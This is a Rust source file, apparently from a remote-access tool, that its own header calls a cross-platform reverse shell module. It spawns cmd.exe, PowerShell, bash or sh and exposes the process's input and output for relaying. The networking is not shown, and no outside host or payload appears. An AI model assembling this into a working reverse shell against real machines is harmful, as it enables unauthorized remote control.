//! Cross-platform reverse shell module
//!
//! Provides shell spawning functionality with platform-specific implementations
//! for Windows (cmd.exe/powershell.exe) and Unix (bash/sh).

use shared::error::NetworkError;
use shared::packets::ShellType;
use std::io::{Read, Write};
use std::process::{Child, ChildStdin, ChildStdout};

#[cfg(unix)]
mod unix;

#[cfg(windows)]
mod windows;

pub mod osc7;

/// Shell session managing a spawned process
pub struct ShellSession {
    process: Option<Child>,
    stdin: Option<ChildStdin>,
    stdout: Option<ChildStdout>,
}

impl ShellSession {
    /// Spawn a new shell process based on the requested type
    ///
    /// # Errors
    /// Returns `NetworkError` if shell cannot be spawned
    pub fn spawn(shell_type: ShellType) -> Result<Self, NetworkError> {
        #[cfg(unix)]
        {
            unix::spawn_shell(shell_type)
        }

        #[cfg(windows)]
        {
            windows::spawn_shell(shell_type)
        }
    }

    /// Decompose the shell session into its components
    ///
    /// This allows separate threads to manage stdin, stdout, and process monitoring
    pub fn into_parts(mut self) -> (ChildStdin, ChildStdout, Child) {
        (
            self.stdin.take().expect("stdin already taken"),
            self.stdout.take().expect("stdout already taken"),
            self.process.take().expect("process already taken"),
        )
    }

    /// Write data to the shell's stdin
    ///
    /// # Errors
    /// Returns `NetworkError` if write fails
    #[allow(dead_code)]
    pub fn write_shell_input(&mut self, data: &[u8]) -> Result<(), NetworkError> {
        if let Some(stdin) = &mut self.stdin {
            stdin.write_all(data)?;
            stdin.flush()?;
        }
        Ok(())
    }

    /// Read output from shell (non-blocking read)
    ///
    /// # Errors
    /// Returns `NetworkError` if read fails
    /// Returns `Ok(None)` if process has exited
    #[allow(dead_code)]
    pub fn read_shell_output(&mut self) -> Result<Option<Vec<u8>>, NetworkError> {
        // Check if process is still running
        if !self.is_alive() {
            return Ok(None);
        }

        if let Some(stdout) = &mut self.stdout {
            let mut buffer = vec![0u8; 4096];
            match stdout.read(&mut buffer) {
                Ok(0) => Ok(None), // EOF
                Ok(n) => {
                    buffer.truncate(n);
                    Ok(Some(buffer))
                }
                Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => Ok(Some(Vec::new())),
                Err(e) => Err(e.into()),
            }
        } else {
            Ok(None)
        }
    }

    /// Kill the shell process
    pub fn kill(&mut self) {
        if let Some(process) = &mut self.process {
            let _ = process.kill();
        }
    }

    /// Check if the process is still running
    #[allow(dead_code)]
    pub fn is_alive(&mut self) -> bool {
        if let Some(process) = &mut self.process {
            process.try_wait().ok().flatten().is_none()
        } else {
            false
        }
    }
}

impl Drop for ShellSession {
    fn drop(&mut self) {
        self.kill();
    }
}
